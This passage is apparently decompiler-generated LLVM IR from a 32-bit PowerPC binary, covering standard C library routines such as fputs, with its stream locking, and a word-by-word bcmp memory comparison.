  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_lseek64, { 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_10026cc0, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10026ce0 = call i32 @__asm_mfcr()
  %v1_10026ce8 = add i32 %arg2, 56
  store i32 %v1_10026ce8, i32* %r30.global-to-local, align 4
  store i32 %v0_10026ce0, i32* @r29, align 4
  %v2_10026d00 = ptrtoint i32* %stack_var_-40 to i32
  %v1_10026d04 = add i32 %arg2, 52
  %v2_10026d04 = inttoptr i32 %v1_10026d04 to i32*
  %v3_10026d04 = load i32, i32* %v2_10026d04, align 4
  %v3_10026d10 = icmp eq i32 %v3_10026d04, 0
  store i1 %v3_10026d10, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10026d10, label %dec_label_pc_10026d18, label %dec_label_pc_10026d24

dec_label_pc_10026d18:                            ; preds = %entry
  %v4_10026d18 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 %v1_10026ce8)
  %v0_10026d1c = load i32, i32* %r30.global-to-local, align 4
  store i32 268594468, i32* @lr, align 4
  %v1_10026d20 = call i32 @pthread_mutex_lock(i32 %v0_10026d1c)
  %v0_10026d24.pre = load i32, i32* @r31, align 4
  %v0_10026d28.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10026d24

dec_label_pc_10026d24:                            ; preds = %entry, %dec_label_pc_10026d18
  %v0_10026d28 = phi i32 [ %v0_10026ce0, %entry ], [ %v0_10026d28.pre, %dec_label_pc_10026d18 ]
  %v0_10026d24 = phi i32 [ %arg2, %entry ], [ %v0_10026d24.pre, %dec_label_pc_10026d18 ]
  store i32 268594480, i32* @lr, align 4
  %v2_10026d2c = call i32 @__GI_fputs_unlocked(i32 %v0_10026d28, i32 %v0_10026d24)
  store i32 1, i32* @r4, align 4
  store i32 %v2_10026d2c, i32* @r31, align 4
  store i32 %v2_10026d00, i32* @r3, align 4
  %v0_10026d3c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10026d3c, label %dec_label_pc_10026d40, label %dec_label_pc_10026d44

dec_label_pc_10026d40:                            ; preds = %dec_label_pc_10026d24
  store i32 268594500, i32* @lr, align 4
  %v0_10026d40 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10026d48.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10026d44

dec_label_pc_10026d44:                            ; preds = %dec_label_pc_10026d24, %dec_label_pc_10026d40
  %v0_10026d48 = phi i32 [ %v2_10026d2c, %dec_label_pc_10026d24 ], [ %v0_10026d48.pre, %dec_label_pc_10026d40 ]
  %v1_10026d5c = call %0 @__asm_mtcrf(i32 8, i32 %v0_10026ce0)
  ret i32 %v0_10026d48

; uselistorder directives
  uselistorder i32 %v0_10026ce0, { 1, 0, 2 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 13, 3, 9, 5, 11, 0, 10, 7, 8, 1, 2, 4, 15, 6, 14, 12 }
  uselistorder i32 ()* @__pthread_cleanup_pop_restore, { 5, 4, 38, 2, 26, 24, 23, 22, 21, 20, 40, 39, 37, 36, 35, 1, 0, 7, 34, 33, 6, 32, 31, 19, 18, 17, 16, 15, 14, 13, 25, 30, 3, 12, 11, 29, 28, 27, 10, 9, 8 }
  uselistorder i32 (i32, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder i32 (i32)* @pthread_mutex_lock, { 18, 17, 60, 13, 3, 11, 15, 14, 41, 40, 39, 38, 37, 36, 62, 61, 59, 58, 57, 12, 0, 23, 56, 55, 22, 2, 1, 10, 9, 8, 54, 53, 35, 34, 33, 32, 31, 30, 29, 42, 46, 16, 28, 27, 45, 44, 43, 26, 25, 24, 52, 51, 63, 7, 4, 64, 6, 5, 50, 49, 48, 47, 21, 20, 19 }
  uselistorder i32 (i32*, i32, i32)* @__pthread_cleanup_push_defer, { 35, 36, 2, 38, 15, 16, 17, 18, 19, 20, 0, 1, 3, 4, 5, 39, 40, 33, 6, 7, 34, 8, 9, 21, 22, 23, 24, 25, 26, 27, 14, 10, 37, 28, 29, 11, 12, 13, 30, 31, 32 }
  uselistorder i32 268527832, { 0, 26, 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 27, 12, 13, 14, 15, 16, 17, 18, 19, 28, 29, 20, 30, 21, 22, 23, 31, 32, 33, 24, 25, 34 }
  uselistorder i32 52, { 24, 25, 6, 26, 29, 19, 18, 8, 27, 28, 20, 21, 7, 5, 15, 16, 17, 9, 10, 11, 12, 13, 14, 1, 2, 3, 4, 0, 22, 23 }
  uselistorder i32 ()* @__asm_mfcr, { 25, 64, 35, 21, 15, 14, 13, 38, 44, 63, 17, 18, 37, 31, 67, 33, 46, 20, 19, 43, 10, 36, 29, 7, 6, 47, 41, 30, 12, 53, 50, 49, 54, 52, 34, 32, 40, 62, 4, 11, 56, 61, 60, 45, 57, 22, 5, 24, 39, 42, 26, 1, 59, 28, 23, 9, 3, 2, 48, 0, 66, 65, 58, 51, 8, 55, 16, 27 }
  uselistorder label %dec_label_pc_10026d44, { 1, 0 }
  uselistorder label %dec_label_pc_10026d24, { 1, 0 }
}

define i32 @bcmp(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v2_10026d68 = icmp ugt i32 %arg1, 15
  %v3_10026d68 = icmp eq i32 %arg1, 15
  store i1 %v3_10026d68, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg1, i32* @r31, align 4
  br i1 %v2_10026d68, label %dec_label_pc_10026d98.preheader, label %dec_label_pc_10027044

dec_label_pc_10026d98.preheader:                  ; preds = %entry
  %v0_10026d98.pre = load i32, i32* @r4, align 4
  %v0_10026da4.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10026d98

dec_label_pc_10026d7c:                            ; preds = %dec_label_pc_10026d98
  %v1_10026d7c = inttoptr i32 %v0_10026e20 to i8*
  %v2_10026d7c = load i8, i8* %v1_10026d7c, align 1
  %v3_10026d7c = zext i8 %v2_10026d7c to i32
  store i32 %v3_10026d7c, i32* %r9.global-to-local, align 4
  %v1_10026d80 = add i32 %v0_10026dac, -1
  store i32 %v1_10026d80, i32* @r31, align 4
  %v1_10026d84 = inttoptr i32 %v0_10026e24 to i8*
  %v2_10026d84 = load i8, i8* %v1_10026d84, align 1
  %v3_10026d84 = zext i8 %v2_10026d84 to i32
  store i32 %v3_10026d84, i32* %r0.global-to-local, align 4
  %v1_10026d88 = add i32 %v0_10026e20, 1
  %v1_10026d8c = add i32 %v0_10026e24, 1
  store i32 %v1_10026d8c, i32* @r4, align 4
  %v2_10026d90 = sub nsw i32 %v3_10026d7c, %v3_10026d84
  store i32 %v2_10026d90, i32* %r9.global-to-local, align 4
  %v4_10026d94 = icmp eq i8 %v2_10026d7c, %v2_10026d84
  br i1 %v4_10026d94, label %dec_label_pc_10026d98, label %dec_label_pc_1002700c

dec_label_pc_10026d98:                            ; preds = %dec_label_pc_10026d98.preheader, %dec_label_pc_10026d7c
  %v0_10026dac = phi i32 [ %arg1, %dec_label_pc_10026d98.preheader ], [ %v1_10026d80, %dec_label_pc_10026d7c ]
  %v0_10026e20 = phi i32 [ %v0_10026da4.pre, %dec_label_pc_10026d98.preheader ], [ %v1_10026d88, %dec_label_pc_10026d7c ]
  %v0_10026e24 = phi i32 [ %v0_10026d98.pre, %dec_label_pc_10026d98.preheader ], [ %v1_10026d8c, %dec_label_pc_10026d7c ]
  %v1_10026d98 = urem i32 %v0_10026e24, 4
  store i32 %v1_10026d98, i32* %r0.global-to-local, align 4
  %v3_10026d98 = icmp eq i32 %v1_10026d98, 0
  store i32 %v0_10026e24, i32* %r29.global-to-local, align 4
  br i1 %v3_10026d98, label %dec_label_pc_10026da4, label %dec_label_pc_10026d7c

dec_label_pc_10026da4:                            ; preds = %dec_label_pc_10026d98
  %v1_10026da4 = urem i32 %v0_10026e20, 4
  %v3_10026da4 = icmp eq i32 %v1_10026da4, 0
  store i32 %v0_10026e20, i32* @r30, align 4
  %v1_10026dac = udiv i32 %v0_10026dac, 4
  store i32 %v1_10026dac, i32* %r9.global-to-local, align 4
  %v1_10026db4 = urem i32 %v1_10026dac, 4
  store i32 %v1_10026db4, i32* %r0.global-to-local, align 4
  br i1 %v3_10026da4, label %dec_label_pc_10026db4, label %dec_label_pc_10026eb4

dec_label_pc_10026db4:                            ; preds = %dec_label_pc_10026da4
  %v3_10026dbc = icmp eq i32 %v1_10026db4, 1
  store i1 %v3_10026dbc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10026dbc, label %dec_label_pc_10026e14, label %dec_label_pc_10026dc4

dec_label_pc_10026dc4:                            ; preds = %dec_label_pc_10026db4
  %v1_10026dbc = icmp eq i32 %v1_10026db4, 0
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10026dbc, label %dec_label_pc_10026e08, label %dec_label_pc_10026dcc

dec_label_pc_10026dcc:                            ; preds = %dec_label_pc_10026dc4
  %v3_10026dcc = icmp eq i32 %v1_10026db4, 3
  store i1 %v3_10026dcc, i1* %cr7_eq.global-to-local, align 1
  %v1_10026dd0 = inttoptr i32 %v0_10026e24 to i32*
  %v2_10026dd0 = load i32, i32* %v1_10026dd0, align 4
  %v1_10026dd4 = inttoptr i32 %v0_10026e20 to i32*
  %v2_10026dd4 = load i32, i32* %v1_10026dd4, align 4
  store i32 %v2_10026dd4, i32* %r0.global-to-local, align 4
  br i1 %v3_10026dcc, label %dec_label_pc_10026df4, label %dec_label_pc_10026ddc

dec_label_pc_10026ddc:                            ; preds = %dec_label_pc_10026dcc
  %v1_10026de0 = add i32 %v0_10026e20, -8
  store i32 %v2_10026dd0, i32* %r0.global-to-local, align 4
  %v1_10026de8 = add i32 %v0_10026e24, -8
  %v1_10026dec = add nuw nsw i32 %v1_10026dac, 2
  br label %dec_label_pc_10026e60

dec_label_pc_10026df4:                            ; preds = %dec_label_pc_10026dcc
  %v1_10026df8 = add i32 %v0_10026e20, -4
  %v1_10026dfc = add i32 %v0_10026e24, -4
  %v1_10026e00 = add nuw nsw i32 %v1_10026dac, 1
  br label %dec_label_pc_10026e50

dec_label_pc_10026e08:                            ; preds = %dec_label_pc_10026dc4
  %v1_10026e08 = inttoptr i32 %v0_10026e20 to i32*
  %v2_10026e08 = load i32, i32* %v1_10026e08, align 4
  store i32 %v2_10026e08, i32* %r9.global-to-local, align 4
  %v1_10026e0c = inttoptr i32 %v0_10026e24 to i32*
  %v2_10026e0c = load i32, i32* %v1_10026e0c, align 4
  store i32 %v2_10026e0c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10026e38

dec_label_pc_10026e14:                            ; preds = %dec_label_pc_10026db4
  %v1_10026e14 = inttoptr i32 %v0_10026e20 to i32*
  %v2_10026e14 = load i32, i32* %v1_10026e14, align 4
  %v1_10026e18 = add nsw i32 %v1_10026dac, -1
  %v1_10026e1c = inttoptr i32 %v0_10026e24 to i32*
  %v2_10026e1c = load i32, i32* %v1_10026e1c, align 4
  %v1_10026e20 = add i32 %v0_10026e20, 4
  %v1_10026e24 = add i32 %v0_10026e24, 4
  br label %dec_label_pc_10026e28

dec_label_pc_10026e28:                            ; preds = %dec_label_pc_10026e80, %dec_label_pc_10026e14
  %v0_10026e7861 = phi i32 [ %v1_10026e78, %dec_label_pc_10026e80 ], [ %v1_10026e18, %dec_label_pc_10026e14 ]
  %v0_10026e2c = phi i32 [ %v1_10026e80, %dec_label_pc_10026e80 ], [ %v1_10026e20, %dec_label_pc_10026e14 ]
  %v1_10026e28 = phi i32 [ %v3_10026e68, %dec_label_pc_10026e80 ], [ %v2_10026e1c, %dec_label_pc_10026e14 ]
  %v0_10026e28 = phi i32 [ %v3_10026e64, %dec_label_pc_10026e80 ], [ %v2_10026e14, %dec_label_pc_10026e14 ]
  %storemerge1 = phi i32 [ %v1_10026e84, %dec_label_pc_10026e80 ], [ %v1_10026e24, %dec_label_pc_10026e14 ]
  %v4_10026e28 = icmp eq i32 %v0_10026e28, %v1_10026e28
  store i1 %v4_10026e28, i1* %cr7_eq.global-to-local, align 1
  %v1_10026e2c = inttoptr i32 %v0_10026e2c to i32*
  %v2_10026e2c = load i32, i32* %v1_10026e2c, align 4
  store i32 %v2_10026e2c, i32* %r9.global-to-local, align 4
  %v1_10026e30 = inttoptr i32 %storemerge1 to i32*
  %v2_10026e30 = load i32, i32* %v1_10026e30, align 4
  store i32 %v2_10026e30, i32* %r0.global-to-local, align 4
  br i1 %v4_10026e28, label %dec_label_pc_10026e38, label %dec_label_pc_10026e9c

dec_label_pc_10026e38:                            ; preds = %dec_label_pc_10026e28, %dec_label_pc_10026e08
  %v0_10026e7860 = phi i32 [ %v0_10026e7861, %dec_label_pc_10026e28 ], [ %v1_10026dac, %dec_label_pc_10026e08 ]
  %v0_10026e40 = phi i32 [ %storemerge1, %dec_label_pc_10026e28 ], [ %v0_10026e24, %dec_label_pc_10026e08 ]
  %v0_10026e3c = phi i32 [ %v0_10026e2c, %dec_label_pc_10026e28 ], [ %v0_10026e20, %dec_label_pc_10026e08 ]
  %v1_10026e48 = phi i32 [ %v2_10026e30, %dec_label_pc_10026e28 ], [ %v2_10026e0c, %dec_label_pc_10026e08 ]
  %v0_10026e48 = phi i32 [ %v2_10026e2c, %dec_label_pc_10026e28 ], [ %v2_10026e08, %dec_label_pc_10026e08 ]
  %v4_10026e38 = icmp eq i32 %v0_10026e48, %v1_10026e48
  store i1 %v4_10026e38, i1* %cr7_eq.global-to-local, align 1
  %v1_10026e3c = add i32 %v0_10026e3c, 4
  %v2_10026e3c = inttoptr i32 %v1_10026e3c to i32*
  %v3_10026e3c = load i32, i32* %v2_10026e3c, align 4
  %v1_10026e40 = add i32 %v0_10026e40, 4
  %v2_10026e40 = inttoptr i32 %v1_10026e40 to i32*
  %v3_10026e40 = load i32, i32* %v2_10026e40, align 4
  br i1 %v4_10026e38, label %dec_label_pc_10026e50, label %dec_label_pc_10026e48

dec_label_pc_10026e48:                            ; preds = %dec_label_pc_10026e38
  %v3_10026e48 = icmp ugt i32 %v0_10026e48, %v1_10026e48
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10026e48, label %dec_label_pc_10026ea8, label %dec_label_pc_10026ea0

dec_label_pc_10026e50:                            ; preds = %dec_label_pc_10026e38, %dec_label_pc_10026df4
  %v0_10026e7859 = phi i32 [ %v0_10026e7860, %dec_label_pc_10026e38 ], [ %v1_10026e00, %dec_label_pc_10026df4 ]
  %v0_10026e58 = phi i32 [ %v0_10026e40, %dec_label_pc_10026e38 ], [ %v1_10026dfc, %dec_label_pc_10026df4 ]
  %v0_10026e54 = phi i32 [ %v0_10026e3c, %dec_label_pc_10026e38 ], [ %v1_10026df8, %dec_label_pc_10026df4 ]
  %v1_10026e50 = phi i32 [ %v3_10026e40, %dec_label_pc_10026e38 ], [ %v2_10026dd0, %dec_label_pc_10026df4 ]
  %v0_10026e50 = phi i32 [ %v3_10026e3c, %dec_label_pc_10026e38 ], [ %v2_10026dd4, %dec_label_pc_10026df4 ]
  %v4_10026e50 = icmp eq i32 %v0_10026e50, %v1_10026e50
  store i1 %v4_10026e50, i1* %cr7_eq.global-to-local, align 1
  %v1_10026e54 = add i32 %v0_10026e54, 8
  %v2_10026e54 = inttoptr i32 %v1_10026e54 to i32*
  %v3_10026e54 = load i32, i32* %v2_10026e54, align 4
  %v1_10026e58 = add i32 %v0_10026e58, 8
  %v2_10026e58 = inttoptr i32 %v1_10026e58 to i32*
  %v3_10026e58 = load i32, i32* %v2_10026e58, align 4
  store i32 %v3_10026e58, i32* %r0.global-to-local, align 4
  br i1 %v4_10026e50, label %dec_label_pc_10026e60, label %dec_label_pc_10026e9c

dec_label_pc_10026e60:                            ; preds = %dec_label_pc_10026e50, %dec_label_pc_10026ddc
  %v0_10026e78 = phi i32 [ %v0_10026e7859, %dec_label_pc_10026e50 ], [ %v1_10026dec, %dec_label_pc_10026ddc ]
  %v0_10026e84 = phi i32 [ %v0_10026e58, %dec_label_pc_10026e50 ], [ %v1_10026de8, %dec_label_pc_10026ddc ]
  %v0_10026e80 = phi i32 [ %v0_10026e54, %dec_label_pc_10026e50 ], [ %v1_10026de0, %dec_label_pc_10026ddc ]
  %v1_10026e70 = phi i32 [ %v3_10026e58, %dec_label_pc_10026e50 ], [ %v2_10026dd0, %dec_label_pc_10026ddc ]
  %v0_10026e70 = phi i32 [ %v3_10026e54, %dec_label_pc_10026e50 ], [ %v2_10026dd4, %dec_label_pc_10026ddc ]
  %v4_10026e60 = icmp eq i32 %v0_10026e70, %v1_10026e70
  store i1 %v4_10026e60, i1* %cr7_eq.global-to-local, align 1
  %v1_10026e64 = add i32 %v0_10026e80, 12
  %v2_10026e64 = inttoptr i32 %v1_10026e64 to i32*
  %v3_10026e64 = load i32, i32* %v2_10026e64, align 4
  %v1_10026e68 = add i32 %v0_10026e84, 12
  %v2_10026e68 = inttoptr i32 %v1_10026e68 to i32*
  %v3_10026e68 = load i32, i32* %v2_10026e68, align 4
  br i1 %v4_10026e60, label %dec_label_pc_10026e78, label %dec_label_pc_10026e70

dec_label_pc_10026e70:                            ; preds = %dec_label_pc_10026e60
  %v3_10026e70 = icmp ugt i32 %v0_10026e70, %v1_10026e70
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10026e70, label %dec_label_pc_10026ea8, label %dec_label_pc_10026ea0

dec_label_pc_10026e78:                            ; preds = %dec_label_pc_10026e60
  %v1_10026e78 = add i32 %v0_10026e78, -4
  %v4_10026e78 = icmp eq i32 %v1_10026e78, 0
  br i1 %v4_10026e78, label %dec_label_pc_10026e8c, label %dec_label_pc_10026e80

dec_label_pc_10026e80:                            ; preds = %dec_label_pc_10026e78
  %v1_10026e80 = add i32 %v0_10026e80, 16
  %v1_10026e84 = add i32 %v0_10026e84, 16
  br label %dec_label_pc_10026e28

dec_label_pc_10026e8c:                            ; preds = %dec_label_pc_10026e78
  %v4_10026e8c = icmp eq i32 %v3_10026e64, %v3_10026e68
  store i1 %v4_10026e8c, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v4_10026e8c, label %dec_label_pc_10027000, label %dec_label_pc_10026e9c

dec_label_pc_10026e9c:                            ; preds = %dec_label_pc_10026e8c, %dec_label_pc_10026e28, %dec_label_pc_10026e50
  %v1_10026e98 = phi i32 [ %v3_10026e68, %dec_label_pc_10026e8c ], [ %v1_10026e28, %dec_label_pc_10026e28 ], [ %v1_10026e50, %dec_label_pc_10026e50 ]
  %v0_10026e98 = phi i32 [ %v3_10026e64, %dec_label_pc_10026e8c ], [ %v0_10026e28, %dec_label_pc_10026e28 ], [ %v0_10026e50, %dec_label_pc_10026e50 ]
  %v3_10026e98 = icmp ugt i32 %v0_10026e98, %v1_10026e98
  %v4_10026e98 = icmp eq i32 %v0_10026e98, %v1_10026e98
  store i1 %v4_10026e98, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10026e98, label %dec_label_pc_10026ea8, label %dec_label_pc_10026ea0

dec_label_pc_10026ea0:                            ; preds = %dec_label_pc_10026e48, %dec_label_pc_10026e70, %dec_label_pc_10026e9c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10027000

dec_label_pc_10026ea8:                            ; preds = %dec_label_pc_10026e48, %dec_label_pc_10026e70, %dec_label_pc_10026e9c
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10027000

dec_label_pc_10026eb4:                            ; preds = %dec_label_pc_10026da4
  %v1_10026eb8 = mul nuw nsw i32 %v1_10026da4, 8
  %v3_10026ebc = icmp eq i32 %v1_10026db4, 1
  store i1 %v3_10026ebc, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10026dac, i32* %r6.global-to-local, align 4
  %v1_10026ec4 = call i32 @__asm_rlwinm(i32 %v0_10026e20, i32 0, i32 0, i32 29)
  %v1_10026ec8 = sub nsw i32 32, %v1_10026eb8
  %v0_10026ecc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10026ecc, label %dec_label_pc_10026f2c, label %dec_label_pc_10026ed0

dec_label_pc_10026ed0:                            ; preds = %dec_label_pc_10026eb4
  %v0_10026ed0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10026ed0 = icmp eq i32 %v0_10026ed0, 0
  %v3_10026ed0 = icmp eq i32 %v0_10026ed0, 1
  store i1 %v3_10026ed0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10026ed0, label %dec_label_pc_10026f1c, label %dec_label_pc_10026ed8

dec_label_pc_10026ed8:                            ; preds = %dec_label_pc_10026ed0
  %v3_10026ed8 = icmp eq i32 %v0_10026ed0, 3
  store i1 %v3_10026ed8, i1* %cr7_eq.global-to-local, align 1
  %v0_10026edc = load i32, i32* @r4, align 4
  %v1_10026edc = inttoptr i32 %v0_10026edc to i32*
  %v2_10026edc = load i32, i32* %v1_10026edc, align 4
  %v1_10026ee0 = inttoptr i32 %v1_10026ec4 to i32*
  %v2_10026ee0 = load i32, i32* %v1_10026ee0, align 4
  store i32 %v2_10026ee0, i32* %r0.global-to-local, align 4
  %v1_10026ee4 = add i32 %v1_10026ec4, 4
  %v2_10026ee4 = inttoptr i32 %v1_10026ee4 to i32*
  %v3_10026ee4 = load i32, i32* %v2_10026ee4, align 4
  store i32 %v3_10026ee4, i32* %r9.global-to-local, align 4
  br i1 %v3_10026ed8, label %dec_label_pc_10026f04, label %dec_label_pc_10026eec

dec_label_pc_10026eec:                            ; preds = %dec_label_pc_10026ed8
  %v1_10026ef4 = add i32 %v1_10026ec4, -4
  %v1_10026ef8 = add i32 %v0_10026edc, -8
  %v0_10026efc = load i32, i32* %r6.global-to-local, align 4
  %v1_10026efc = add i32 %v0_10026efc, 2
  store i32 %v1_10026efc, i32* %r6.global-to-local, align 4
  %.pre82 = urem i32 %v1_10026eb8, 64
  %.pre83 = urem i32 %v1_10026ec8, 64
  br label %dec_label_pc_10026f98

dec_label_pc_10026f04:                            ; preds = %dec_label_pc_10026ed8
  %v1_10026f10 = add i32 %v0_10026edc, -4
  %v0_10026f14 = load i32, i32* %r6.global-to-local, align 4
  %v1_10026f14 = add i32 %v0_10026f14, 1
  store i32 %v1_10026f14, i32* %r6.global-to-local, align 4
  %.pre80 = urem i32 %v1_10026eb8, 64
  %.pre81 = urem i32 %v1_10026ec8, 64
  br label %dec_label_pc_10026f7c

dec_label_pc_10026f1c:                            ; preds = %dec_label_pc_10026ed0
  %v1_10026f1c = inttoptr i32 %v1_10026ec4 to i32*
  %v2_10026f1c = load i32, i32* %v1_10026f1c, align 4
  %v0_10026f20 = load i32, i32* @r4, align 4
  %v1_10026f24 = add i32 %v1_10026ec4, 4
  %v2_10026f24 = inttoptr i32 %v1_10026f24 to i32*
  %v3_10026f24 = load i32, i32* %v2_10026f24, align 4
  %.pre78 = urem i32 %v1_10026eb8, 64
  %.pre79 = urem i32 %v1_10026ec8, 64
  br label %dec_label_pc_10026f60

dec_label_pc_10026f2c:                            ; preds = %dec_label_pc_10026eb4
  %v1_10026f2c = inttoptr i32 %v1_10026ec4 to i32*
  %v2_10026f2c = load i32, i32* %v1_10026f2c, align 4
  %v0_10026f30 = load i32, i32* %r9.global-to-local, align 4
  %v1_10026f30 = add i32 %v0_10026f30, -1
  store i32 %v1_10026f30, i32* %r6.global-to-local, align 4
  %v1_10026f34 = add i32 %v1_10026ec4, 4
  %v2_10026f34 = inttoptr i32 %v1_10026f34 to i32*
  %v3_10026f34 = load i32, i32* %v2_10026f34, align 4
  %v1_10026f38 = add i32 %v1_10026ec4, 8
  %v0_10026f3c = load i32, i32* @r4, align 4
  %v1_10026f3c = inttoptr i32 %v0_10026f3c to i32*
  %v2_10026f3c = load i32, i32* %v1_10026f3c, align 4
  %v1_10026f40 = add i32 %v0_10026f3c, 4
  %.pre = urem i32 %v1_10026eb8, 64
  %.pre77 = urem i32 %v1_10026ec8, 64
  br label %dec_label_pc_10026f44

dec_label_pc_10026f44:                            ; preds = %dec_label_pc_10026fc4, %dec_label_pc_10026f2c
  %v2_10026f48.pre-phi = phi i32 [ %v2_10026f9c.pre-phi, %dec_label_pc_10026fc4 ], [ %.pre77, %dec_label_pc_10026f2c ]
  %v2_10026f44.pre-phi = phi i32 [ %v2_10026f98.pre-phi, %dec_label_pc_10026fc4 ], [ %.pre, %dec_label_pc_10026f2c ]
  %v1_10026f54 = phi i32 [ %v3_10026fac, %dec_label_pc_10026fc4 ], [ %v2_10026f3c, %dec_label_pc_10026f2c ]
  %v0_10026f50 = phi i32 [ %v1_10026fc4, %dec_label_pc_10026fc4 ], [ %v1_10026f38, %dec_label_pc_10026f2c ]
  %v0_10026f48 = phi i32 [ %v3_10026fa4, %dec_label_pc_10026fc4 ], [ %v3_10026f34, %dec_label_pc_10026f2c ]
  %v0_10026f44 = phi i32 [ %v0_10026fd0, %dec_label_pc_10026fc4 ], [ %v2_10026f2c, %dec_label_pc_10026f2c ]
  %storemerge2 = phi i32 [ %v1_10026fc8, %dec_label_pc_10026fc4 ], [ %v1_10026f40, %dec_label_pc_10026f2c ]
  %v3_10026f44 = shl i32 %v0_10026f44, %v2_10026f44.pre-phi
  %v3_10026f48 = lshr i32 %v0_10026f48, %v2_10026f48.pre-phi
  store i32 %v3_10026f48, i32* %r9.global-to-local, align 4
  %v2_10026f4c = or i32 %v3_10026f44, %v3_10026f48
  store i32 %v2_10026f4c, i32* %r0.global-to-local, align 4
  %v1_10026f50 = inttoptr i32 %v0_10026f50 to i32*
  %v2_10026f50 = load i32, i32* %v1_10026f50, align 4
  %v4_10026f54 = icmp eq i32 %v2_10026f4c, %v1_10026f54
  store i1 %v4_10026f54, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10026f54, label %dec_label_pc_10026f60, label %dec_label_pc_10026fe8

dec_label_pc_10026f60:                            ; preds = %dec_label_pc_10026f44, %dec_label_pc_10026f1c
  %v2_10026f64.pre-phi = phi i32 [ %v2_10026f48.pre-phi, %dec_label_pc_10026f44 ], [ %.pre79, %dec_label_pc_10026f1c ]
  %v2_10026f60.pre-phi = phi i32 [ %v2_10026f44.pre-phi, %dec_label_pc_10026f44 ], [ %.pre78, %dec_label_pc_10026f1c ]
  %v0_10026f74 = phi i32 [ %storemerge2, %dec_label_pc_10026f44 ], [ %v0_10026f20, %dec_label_pc_10026f1c ]
  %v1_10026f70.in.in = phi i32 [ %storemerge2, %dec_label_pc_10026f44 ], [ %v0_10026f20, %dec_label_pc_10026f1c ]
  %v0_10026f6c = phi i32 [ %v0_10026f50, %dec_label_pc_10026f44 ], [ %v1_10026f24, %dec_label_pc_10026f1c ]
  %v0_10026f64 = phi i32 [ %v2_10026f50, %dec_label_pc_10026f44 ], [ %v3_10026f24, %dec_label_pc_10026f1c ]
  %v0_10026f60 = phi i32 [ %v0_10026f48, %dec_label_pc_10026f44 ], [ %v2_10026f1c, %dec_label_pc_10026f1c ]
  %v1_10026f70.in = inttoptr i32 %v1_10026f70.in.in to i32*
  %v1_10026f70 = load i32, i32* %v1_10026f70.in, align 4
  %v3_10026f60 = shl i32 %v0_10026f60, %v2_10026f60.pre-phi
  %v3_10026f64 = lshr i32 %v0_10026f64, %v2_10026f64.pre-phi
  store i32 %v3_10026f64, i32* %r9.global-to-local, align 4
  %v2_10026f68 = or i32 %v3_10026f60, %v3_10026f64
  store i32 %v2_10026f68, i32* %r0.global-to-local, align 4
  %v1_10026f6c = add i32 %v0_10026f6c, 4
  %v2_10026f6c = inttoptr i32 %v1_10026f6c to i32*
  %v3_10026f6c = load i32, i32* %v2_10026f6c, align 4
  %v4_10026f70 = icmp eq i32 %v2_10026f68, %v1_10026f70
  store i1 %v4_10026f70, i1* %cr7_eq.global-to-local, align 1
  %v1_10026f74 = add i32 %v0_10026f74, 4
  %v2_10026f74 = inttoptr i32 %v1_10026f74 to i32*
  %v3_10026f74 = load i32, i32* %v2_10026f74, align 4
  br i1 %v4_10026f70, label %dec_label_pc_10026f7c, label %dec_label_pc_10026fec

dec_label_pc_10026f7c:                            ; preds = %dec_label_pc_10026f60, %dec_label_pc_10026f04
  %v2_10026f80.pre-phi = phi i32 [ %v2_10026f64.pre-phi, %dec_label_pc_10026f60 ], [ %.pre81, %dec_label_pc_10026f04 ]
  %v2_10026f7c.pre-phi = phi i32 [ %v2_10026f60.pre-phi, %dec_label_pc_10026f60 ], [ %.pre80, %dec_label_pc_10026f04 ]
  %v0_10026f90 = phi i32 [ %v0_10026f74, %dec_label_pc_10026f60 ], [ %v1_10026f10, %dec_label_pc_10026f04 ]
  %v1_10026f8c = phi i32 [ %v3_10026f74, %dec_label_pc_10026f60 ], [ %v2_10026edc, %dec_label_pc_10026f04 ]
  %v0_10026f88 = phi i32 [ %v0_10026f6c, %dec_label_pc_10026f60 ], [ %v1_10026ec4, %dec_label_pc_10026f04 ]
  %v0_10026f80 = phi i32 [ %v3_10026f6c, %dec_label_pc_10026f60 ], [ %v3_10026ee4, %dec_label_pc_10026f04 ]
  %v0_10026f7c = phi i32 [ %v0_10026f64, %dec_label_pc_10026f60 ], [ %v2_10026ee0, %dec_label_pc_10026f04 ]
